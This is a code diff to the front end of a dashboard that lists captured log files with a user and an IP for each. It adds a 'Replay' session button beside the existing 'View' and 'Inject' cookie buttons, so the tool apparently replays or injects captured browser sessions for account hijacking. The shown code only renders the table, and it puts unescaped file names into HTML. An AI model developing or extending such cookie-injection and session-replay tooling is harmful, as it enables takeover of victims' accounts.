@@ -727,40 +727,41 @@
     }
 
     function renderTable(logs) {
-        const tbody = document.getElementById('logTable');
-        const search = document.getElementById('searchInput').value.toLowerCase();
-        const filter = document.getElementById('filterDate').value;
-        const now = new Date();
-        let filtered = logs;
+    const tbody = document.getElementById('logTable');
+    const search = document.getElementById('searchInput').value.toLowerCase();
+    const filter = document.getElementById('filterDate').value;
+    const now = new Date();
+    let filtered = logs;
 
-        if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
-        if (filter === 'today') {
-            filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
-        } else if (filter === 'week') {
-            const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
-            filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
-        }
-
-        tbody.innerHTML = '';
-        filtered.forEach(log => {
-            const date = new Date(log.modified).toLocaleString();
-            const row = document.createElement('tr');
-            row.innerHTML = `
-                <td><span class="badge">${log.name}</span></td>
-                <td>${(log.size / 1024).toFixed(1)} KB</td>
-                <td>${date}</td>
-                <td id="user-${log.name}">Loading...</td>
-                <td id="ip-${log.name}">Loading...</td>
-                <td>
-                    <button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button>
-                    <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
-                </td>
-            `;
-            tbody.appendChild(row);
-            fetchMetadata(log.name);
-        });
+    if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
+    if (filter === 'today') {
+        filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
+    } else if (filter === 'week') {
+        const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
+        filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
     }
 
+    tbody.innerHTML = '';
+    filtered.forEach(log => {
+        const date = new Date(log.modified).toLocaleString();
+        const row = document.createElement('tr');
+        // ✅ UPDATED: Added Replay button
+        row.innerHTML = `
+            <td><span class="badge">${log.name}</span></td>
+            <td>${(log.size / 1024).toFixed(1)} KB</td>
+            <td>${date}</td>
+            <td id="user-${log.name}">Loading...</td>
+            <td id="ip-${log.name}">Loading...</td>
+            <td>
+                <button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button>
+                <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
+                <button class="action-btn replay" onclick="replaySession('${log.name}')" style="border-color:rgba(0,255,200,0.3);color:#00ffc8;">▶ Replay</button>
+            </td>
+        `;
+        tbody.appendChild(row);
+        fetchMetadata(log.name);
+    });
+}
     async function fetchMetadata(filename) {
     try {
         const res = await fetch(`/dash/api/log/${filename}`);
